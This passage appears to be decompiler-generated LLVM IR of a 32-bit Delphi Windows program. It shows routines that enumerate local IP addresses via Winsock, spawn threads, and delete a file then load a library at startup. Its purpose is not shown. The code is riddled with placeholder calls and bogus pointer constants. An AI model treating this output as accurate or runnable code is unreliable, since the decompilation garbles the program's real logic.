  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1988
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1989
  %6 = call i32 @"@LStrClr"(), !insn.addr !1990
  ret i32 %6, !insn.addr !1991
}

define i32 @function_407779() local_unnamed_addr {
dec_label_pc_407779:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1992
  ret i32 %0, !insn.addr !1992
}

define i32 @function_40777e() local_unnamed_addr {
dec_label_pc_40777e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1993
}

define i32 @function_407780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407780:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1994
}

define i32 @function_40779b() local_unnamed_addr {
dec_label_pc_40779b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1995
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1995
  store i32 %3, i32* %4, align 4, !insn.addr !1995
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1996
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1996
  %9 = add i8 %6, %8, !insn.addr !1996
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1996
  store i8 %9, i8* %10, align 1, !insn.addr !1996
  %11 = add i32 %2, 81, !insn.addr !1997
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1997
  %13 = load i8, i8* %12, align 1, !insn.addr !1997
  %14 = trunc i32 %1 to i8, !insn.addr !1997
  %15 = add i8 %13, %14, !insn.addr !1997
  store i8 %15, i8* %12, align 1, !insn.addr !1997
  %16 = load i32, i32* %eax, align 4, !insn.addr !1998
  ret i32 %16, !insn.addr !1998
}

define x86_fp80 @function_4077a3() local_unnamed_addr {
dec_label_pc_4077a3:
  %0 = call x86_fp80 @__decompiler_undefined_function_12()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1999
  ret x86_fp80 %1, !insn.addr !2000
}

define i32 @function_4077a8() local_unnamed_addr {
dec_label_pc_4077a8:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !2001
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2002
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !2002
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2002
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2003
  %3 = call i32 @function_4075ac(), !insn.addr !2004
  %4 = call i32 @"@LStrCmp"(), !insn.addr !2005
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !2006
  %6 = icmp eq i32 %5, 180, !insn.addr !2007
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !2008
  br i1 %6, label %dec_label_pc_40780b, label %dec_label_pc_4077e6, !insn.addr !2008

dec_label_pc_4077e6:                              ; preds = %dec_label_pc_4077a8
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !2009
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !2010
  %10 = icmp eq i1 %9, false, !insn.addr !2011
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !2011
  br i1 %10, label %dec_label_pc_40780b, label %dec_label_pc_4077f2, !insn.addr !2011

dec_label_pc_4077f2:                              ; preds = %dec_label_pc_4077e6
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !2012
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40780b

dec_label_pc_40780b:                              ; preds = %dec_label_pc_4077f2, %dec_label_pc_4077a8, %dec_label_pc_4077e6
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !2013
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !2014
  %13 = add i32 %esp.1, 8, !insn.addr !2015
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2015
  store i32 4225070, i32* %14, align 4, !insn.addr !2015
  %15 = call i32 @"@LStrClr"(), !insn.addr !2016
  ret i32 %15, !insn.addr !2017
}

define i32 @function_407827() local_unnamed_addr {
dec_label_pc_407827:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2018
  ret i32 %0, !insn.addr !2018
}

define i32 @function_40782c() local_unnamed_addr {
dec_label_pc_40782c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2019
}

define i32 @function_40782e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40782e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2020
}

define i32 @function_407844() local_unnamed_addr {
dec_label_pc_407844:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2021
  %3 = call i32* @GetDC(i32* %2), !insn.addr !2021
  %4 = ptrtoint i32* %3 to i32, !insn.addr !2021
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !2022
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2023
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !2023
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2024
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2025
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2026
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2027
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2027
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2028
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2029
  %16 = ashr i32 %15, 31, !insn.addr !2030
  %17 = zext i32 %15 to i64, !insn.addr !2031
  %18 = zext i32 %16 to i64, !insn.addr !2031
  %19 = mul i64 %18, 4294967296, !insn.addr !2031
  %20 = or i64 %19, %17, !insn.addr !2031
  %21 = zext i32 %4 to i64, !insn.addr !2031
  %22 = sdiv i64 %20, %21, !insn.addr !2031
  %23 = trunc i64 %22 to i32, !insn.addr !2031
  ret i32 %23, !insn.addr !2032
}

define i32 @function_4078a0() local_unnamed_addr {
dec_label_pc_4078a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !2033
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2034
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2034
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2034
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2035
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2036
  %3 = icmp eq i32 %2, 0, !insn.addr !2036
  br i1 %3, label %dec_label_pc_4078dc, label %dec_label_pc_4078c9, !insn.addr !2037

dec_label_pc_4078c9:                              ; preds = %dec_label_pc_4078a0
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2038
  store i32 0, i32* %4, align 4, !insn.addr !2038
  br label %dec_label_pc_4078dc, !insn.addr !2039

dec_label_pc_4078dc:                              ; preds = %dec_label_pc_4078c9, %dec_label_pc_4078a0
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2040
  %6 = icmp eq i32 %5, 0, !insn.addr !2040
  br i1 %6, label %dec_label_pc_4078f0, label %dec_label_pc_4078e6, !insn.addr !2041

dec_label_pc_4078e6:                              ; preds = %dec_label_pc_4078dc
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2042
  %8 = icmp eq i32 %7, 0, !insn.addr !2042
  %9 = icmp eq i1 %8, false, !insn.addr !2043
  br i1 %9, label %dec_label_pc_4078fa, label %dec_label_pc_4078f0, !insn.addr !2043

dec_label_pc_4078f0:                              ; preds = %dec_label_pc_4078e6, %dec_label_pc_4078dc
  %10 = call i32 @function_4079d4(), !insn.addr !2044
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2045
  br label %dec_label_pc_407997, !insn.addr !2045

dec_label_pc_4078fa:                              ; preds = %dec_label_pc_4078e6
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2046
  %12 = icmp eq i8 %11, 0, !insn.addr !2046
  br i1 %12, label %dec_label_pc_407923, label %dec_label_pc_407904, !insn.addr !2047

dec_label_pc_407904:                              ; preds = %dec_label_pc_4078fa
  %13 = call i32 @function_4071bc(), !insn.addr !2048
  %14 = icmp eq i32 %13, 0, !insn.addr !2049
  br i1 %14, label %dec_label_pc_407923, label %dec_label_pc_40791c, !insn.addr !2050

dec_label_pc_40791c:                              ; preds = %dec_label_pc_407904
  %15 = call i32 @function_4079d4(), !insn.addr !2051
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2052
  br label %dec_label_pc_407997, !insn.addr !2052

dec_label_pc_407923:                              ; preds = %dec_label_pc_407904, %dec_label_pc_4078fa
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2053
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2054
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2055
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2056
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2057
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2057
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2058
  %23 = call i32 @function_4079d4(), !insn.addr !2059
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2059
  br label %dec_label_pc_407997, !insn.addr !2059

dec_label_pc_407997:                              ; preds = %dec_label_pc_407923, %dec_label_pc_40791c, %dec_label_pc_4078f0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2060
  %25 = load i32, i32* %24, align 4, !insn.addr !2060
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2061
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2062
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2062
  store i32 4225460, i32* %27, align 4, !insn.addr !2062
  %28 = call i32 @"@LStrClr"(), !insn.addr !2063
  ret i32 %28, !insn.addr !2064
}

define i32 @function_4079ad() local_unnamed_addr {
dec_label_pc_4079ad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2065
  ret i32 %0, !insn.addr !2065
}

define i32 @function_4079b2() local_unnamed_addr {
dec_label_pc_4079b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2066
}

define i32 @function_4079b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4079b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2067
}

define i32 @function_4079d4() local_unnamed_addr {
dec_label_pc_4079d4:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2068
  %1 = call i32 @"@LStrClr"(), !insn.addr !2069
  ret i32 %1, !insn.addr !2070
}

define i32 @function_4079ec() local_unnamed_addr {
dec_label_pc_4079ec:
  %eax.0.reg2mem = alloca i32, !insn.addr !2071
  %esp.0.reg2mem = alloca i32, !insn.addr !2071
  %esp.15.reg2mem = alloca i32, !insn.addr !2071
  %storemerge6.reg2mem = alloca i32, !insn.addr !2071
  %.reg2mem = alloca i32, !insn.addr !2071
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2071
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2072
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2073
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2074
  %5 = call i32 @"@LStrClr"(), !insn.addr !2075
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2076
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2076
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2077
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2078
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2079
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2079
  %11 = icmp eq %hostent* %9, null, !insn.addr !2080
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2081
  br i1 %11, label %dec_label_pc_407a4a, label %dec_label_pc_407a24, !insn.addr !2081

dec_label_pc_407a24:                              ; preds = %dec_label_pc_4079ec
  %12 = add i32 %10, 12, !insn.addr !2082
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2082
  %14 = load i32, i32* %13, align 4, !insn.addr !2082
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2083
  %16 = load i32, i32* %15, align 4, !insn.addr !2083
  %17 = icmp eq i32 %16, 0, !insn.addr !2084
  %18 = icmp eq i1 %17, false, !insn.addr !2085
  br i1 %18, label %dec_label_pc_407a2b.lr.ph, label %dec_label_pc_407a45, !insn.addr !2085

dec_label_pc_407a2b.lr.ph:                        ; preds = %dec_label_pc_407a24
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2078
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_407a2b

dec_label_pc_407a2b:                              ; preds = %dec_label_pc_407a2b.lr.ph, %dec_label_pc_407a3d
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2086
  %21 = icmp eq i1 %20, false, !insn.addr !2087
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2087
  br i1 %21, label %dec_label_pc_407a3d, label %dec_label_pc_407a2f, !insn.addr !2087

dec_label_pc_407a2f:                              ; preds = %dec_label_pc_407a2b
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2088
  %23 = load i32, i32* %22, align 4, !insn.addr !2088
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2088
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2088
  store i32 %23, i32* %25, align 4, !insn.addr !2088
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2089
  %27 = call i32 @StrPas(), !insn.addr !2090
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2090
  br label %dec_label_pc_407a3d, !insn.addr !2090

dec_label_pc_407a3d:                              ; preds = %dec_label_pc_407a2f, %dec_label_pc_407a2b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2091
  %29 = mul i32 %28, 4, !insn.addr !2083
  %30 = add i32 %29, %14, !insn.addr !2083
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2083
  %32 = load i32, i32* %31, align 4, !insn.addr !2083
  %33 = icmp eq i32 %32, 0, !insn.addr !2084
  %34 = icmp eq i1 %33, false, !insn.addr !2085
  store i32 %32, i32* %.reg2mem, !insn.addr !2085
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2085
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2085
  br i1 %34, label %dec_label_pc_407a2b, label %dec_label_pc_407a45, !insn.addr !2085

dec_label_pc_407a45:                              ; preds = %dec_label_pc_407a3d, %dec_label_pc_407a24
  %35 = call i32 @WSACleanup(), !insn.addr !2092
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2092
  br label %dec_label_pc_407a4a, !insn.addr !2092

dec_label_pc_407a4a:                              ; preds = %dec_label_pc_407a45, %dec_label_pc_4079ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2093
}

define i32 @function_407a58() local_unnamed_addr {
dec_label_pc_407a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2094
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2094
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2094
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2095
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2096
  %3 = add i32 %2, 1, !insn.addr !2096
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2096
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2097
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2098
  ret i32 0, !insn.addr !2099
}

define i32 @function_407a7d() local_unnamed_addr {
dec_label_pc_407a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2100
  ret i32 %0, !insn.addr !2100
}

define i32 @function_407a82() local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2101
}

define i32 @function_407a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2102
}

define i32 @function_407a88() local_unnamed_addr {
dec_label_pc_407a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2103
  %2 = add i32 %1, -1, !insn.addr !2103
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2103
  ret i32 %0, !insn.addr !2104
}

define i32 @function_407a90() local_unnamed_addr {
dec_label_pc_407a90:
  %stack_var_-24 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2105
  store i32 %0, i32* %stack_var_-24, align 4, !insn.addr !2105
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2105
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2106
  %2 = call i32 @"@LStrLAsg"(), !insn.addr !2107
  %3 = load i32, i32* %stack_var_-24, align 4, !insn.addr !2108
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2109
  %4 = call i32 @"@LStrArrayClr"(), !insn.addr !2110
  ret i32 %4, !insn.addr !2111
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2112
  ret i32 %0, !insn.addr !2112
}

define i32 @function_407ad9() local_unnamed_addr {
dec_label_pc_407ad9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2113
}

define i32 @function_407adb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407adb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2114
}

define i32 @SetFieldText.51() local_unnamed_addr {
dec_label_pc_407aff:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2115
  ret i32 %0, !insn.addr !2115
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2116
}

define i32 @function_407b06(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b06:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2117
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407bf0:
  %esp.2.reg2mem = alloca i32, !insn.addr !2118
  %esp.1.reg2mem = alloca i32, !insn.addr !2118
  %esp.0.reg2mem = alloca i32, !insn.addr !2118
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2119
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2120
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2120
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2120
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2121
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2122
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f0 to i8*), i32 0), !insn.addr !2123
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2124
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2124
  store i8 0, i8* %6, align 1, !insn.addr !2124
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2125
  %8 = call i32 @function_4075e4(), !insn.addr !2126
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2127
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2128
  %11 = call i32 @"@LStrAsg"(), !insn.addr !2129
  %12 = call i32 @function_40765c(), !insn.addr !2130
  %13 = trunc i32 %12 to i8, !insn.addr !2131
  %14 = icmp eq i8 %13, 0, !insn.addr !2131
  br i1 %14, label %dec_label_pc_407d17, label %dec_label_pc_407c9c, !insn.addr !2132

dec_label_pc_407c9c:                              ; preds = %dec_label_pc_407bf0
  %15 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2133
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2134
  store i32 -1, i32* %16, align 4, !insn.addr !2134
  %17 = call i32 @"@LStrFromArray"(), !insn.addr !2135
  %18 = call i32 @function_407624(), !insn.addr !2136
  %19 = call i32 @"@LStrAsg"(), !insn.addr !2137
  %20 = call i32 @"@LStrCat3"(), !insn.addr !2138
  %21 = call i32 @function_4036f4(), !insn.addr !2139
  %22 = inttoptr i32 %21 to i8*, !insn.addr !2140
  %23 = call i1 @DeleteFileA(i8* %22), !insn.addr !2141
  %24 = call i32 @"@LStrCat3"(), !insn.addr !2142
  %25 = call i32 @function_4036f4(), !insn.addr !2143
  %26 = inttoptr i32 %25 to i8*, !insn.addr !2144
  store i8* %26, i8** %stack_var_-136, align 4, !insn.addr !2144
  %27 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2144
  %28 = call i32* @LoadLibraryA(i8* %26), !insn.addr !2145
  %29 = ptrtoint i32* %28 to i32, !insn.addr !2145
  store i32 %29, i32* @global_var_408118, align 4, !insn.addr !2146
  store i32 %27, i32* %esp.0.reg2mem, !insn.addr !2147
  br label %dec_label_pc_407d44, !insn.addr !2147

dec_label_pc_407d17:                              ; preds = %dec_label_pc_407bf0
  %30 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2122
  %31 = call i32 @function_406648(), !insn.addr !2148
  %32 = call i32 @function_40765c(), !insn.addr !2149
  %33 = trunc i32 %32 to i8, !insn.addr !2150
  %34 = icmp eq i8 %33, 0, !insn.addr !2150
  store i32 %30, i32* %esp.2.reg2mem, !insn.addr !2151
  br i1 %34, label %dec_label_pc_407e86, label %dec_label_pc_407d39, !insn.addr !2151

dec_label_pc_407d39:                              ; preds = %dec_label_pc_407d17
  %35 = load i32, i32* @global_var_408138, align 4, !insn.addr !2152
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2153
  store i32 -1, i32* %36, align 4, !insn.addr !2153
  store i32 %30, i32* %esp.0.reg2mem, !insn.addr !2153
  br label %dec_label_pc_407d44, !insn.addr !2153

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407d39, %dec_label_pc_407c9c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %37 = add i32 %esp.0.reload, -4, !insn.addr !2154
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2154
  store i32 260, i32* %38, align 4, !insn.addr !2154
  %39 = add i32 %esp.0.reload, -8, !insn.addr !2155
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2155
  store i32 ptrtoint (i8** @global_var_4096f0 to i32), i32* %40, align 4, !insn.addr !2155
  %41 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2156
  %42 = ptrtoint i32 (i32, i32, i32)* %41 to i32, !insn.addr !2156
  %43 = add i32 %esp.0.reload, -12, !insn.addr !2157
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2157
  store i32 %42, i32* %44, align 4, !insn.addr !2157
  %45 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2158
  %46 = add i32 %45, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2159
  %47 = inttoptr i32 %46 to i8*, !insn.addr !2159
  store i8 0, i8* %47, align 1, !insn.addr !2159
  %48 = call i32 @"@LStrFromArray"(), !insn.addr !2160
  %49 = call i32 @function_407624(), !insn.addr !2161
  %50 = call i32 @"@LStrAsg"(), !insn.addr !2162
  %51 = call i32 @"@LStrCat3"(), !insn.addr !2163
  %52 = load i32, i32* @global_var_408138, align 4, !insn.addr !2164
  %53 = icmp eq i32 %52, 0, !insn.addr !2164
  br i1 %53, label %dec_label_pc_407ddd, label %dec_label_pc_407daa, !insn.addr !2165

dec_label_pc_407daa:                              ; preds = %dec_label_pc_407d44
  %54 = add i32 %esp.0.reload, -16, !insn.addr !2166
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2166
  store i32 ptrtoint ([16 x i8]* @global_var_407f08 to i32), i32* %55, align 4, !insn.addr !2166
  %56 = add i32 %esp.0.reload, -20, !insn.addr !2167
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2167
  store i32 ptrtoint ([8 x i8]* @global_var_407f18 to i32), i32* %57, align 4, !insn.addr !2167
  %58 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2168
  %59 = icmp eq i32* %58, null, !insn.addr !2169
  %60 = icmp eq i1 %59, false, !insn.addr !2170
  store i32 %56, i32* %esp.2.reg2mem, !insn.addr !2170
  br i1 %60, label %dec_label_pc_407e86, label %dec_label_pc_407dc1, !insn.addr !2170

dec_label_pc_407dc1:                              ; preds = %dec_label_pc_407daa
  %61 = add i32 %esp.0.reload, -24, !insn.addr !2171
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2171
  store i32 ptrtoint (i32* @global_var_409810 to i32), i32* %62, align 4, !insn.addr !2171
  %63 = add i32 %esp.0.reload, -28, !insn.addr !2172
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2172
  store i32 0, i32* %64, align 4, !insn.addr !2172
  %65 = add i32 %esp.0.reload, -32, !insn.addr !2173
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2173
  store i32 66, i32* %66, align 4, !insn.addr !2173
  %67 = add i32 %esp.0.reload, -36, !insn.addr !2174
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2174
  store i32 4222148, i32* %68, align 4, !insn.addr !2174
  %69 = add i32 %esp.0.reload, -40, !insn.addr !2175
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2175
  store i32 0, i32* %70, align 4, !insn.addr !2175
  %71 = add i32 %esp.0.reload, -44, !insn.addr !2176
  %72 = inttoptr i32 %71 to i32*, !insn.addr !2176
  store i32 0, i32* %72, align 4, !insn.addr !2176
  %73 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2177
  store i32 %71, i32* %esp.2.reg2mem, !insn.addr !2178
  br label %dec_label_pc_407e86, !insn.addr !2178

dec_label_pc_407ddd:                              ; preds = %dec_label_pc_407d44
  %74 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2179
  %75 = icmp eq i32 %74, 0, !insn.addr !2179
  store i32 %43, i32* %esp.2.reg2mem, !insn.addr !2180
  br i1 %75, label %dec_label_pc_407e86, label %dec_label_pc_407deb, !insn.addr !2180

dec_label_pc_407deb:                              ; preds = %dec_label_pc_407ddd
  %76 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2181
  %77 = icmp eq i8 %76, 0, !insn.addr !2181
  br i1 %77, label %dec_label_pc_407dfa, label %dec_label_pc_407df5, !insn.addr !2182

